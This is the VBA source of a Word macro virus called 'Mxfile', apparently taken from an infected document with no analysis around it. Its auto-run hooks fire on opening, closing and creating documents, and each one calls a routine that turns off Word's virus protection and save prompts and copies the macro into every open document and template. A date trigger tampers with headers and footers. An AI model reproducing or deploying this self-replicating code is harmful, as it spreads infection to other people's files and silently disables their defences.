   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Mxfile"
   Sub toolsmacro()
   Mxfiles
   End Sub
   Sub Autoexit()
   Mxfiles
   End Sub
   Sub Autoexec()
   Mxfiles
   End Sub
   Sub Autonew()
   Mxfiles
   End Sub
   Sub AutoOpen()
   Mxfiles
   End Sub
   Sub Openshell()
   Mxfiles
   End Sub

   Sub Mxfiles()
   Dim txt As String, ddorg As String
   Dim a As Integer, dest As String
   Dim dd, dd1, dd2, ff$
   Dim dayn, monthn, reg, View
   Dim data As Date
   txt = " åÐÇ ÇáÝíÑæÓ ÚÑÖ æÛíÑ ÖÇÑ æßá ãÇíÞæã Èå ßÊÇÈå ÚÈÇÑÉ ßáäÇ äÈÇíÚ ãÈÇÑß"
   On Error Resume Next
   Application.ScreenUpdating = False
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Options.ConfirmConversions = False
   ddorg = ThisDocument.FullName
   For a = 1 To Documents.Count
   If Documents.Item(a).Path <> "" Then
   dest = Documents.Item(a).FullName
   SetAttr dest, vbNormal
   Else
   dest = Documents.Item(a).Name
   End If
   If ddorg <> dest Then
   Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
   If Documents.Item(a).Path <> "" Then
   Documents.Item(a).Save
   End If
   End If
   dd = Documents.Item(a).AttachedTemplate
   dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
   dd2 = dd1 + "\" + dd
   SetAttr dd2, vbNormal
   If ddorg <> dd2 Then
   Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
   End If
   Next a
   ff$ = GetSetting(appname:="network", Section:="unix", Key:="mxfile")
   If Val(ff$) = 255 Then
   Application.ScreenUpdating = True
   Exit Sub
   End If
   data = Now
   dayn = Day(data)
   monthn = month(data)
   reg = dayn Mod monthn
   If reg = 0 And dayn > 10 Then
   If ActiveWindow.ActivePane.View.Type <> wdPageView Then
   View = ActiveWindow.ActivePane.View.Type
   ActiveWindow.ActivePane.View.Type = wdPageView
   End If
    ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
     Selection.EndKey Unit:=wdLine, Extend:=wdExtend
     Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
     'Selection.TypeText Text:=Right(txt, 16)
     ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
     Selection.EndKey Unit:=wdLine, Extend:=wdExtend
     Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
     'Selection.TypeText Text:=Right(txt, 16)
     ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
   ActiveWindow.ActivePane.View.Type = View
   End If
   Application.ScreenUpdating = True
   End Sub
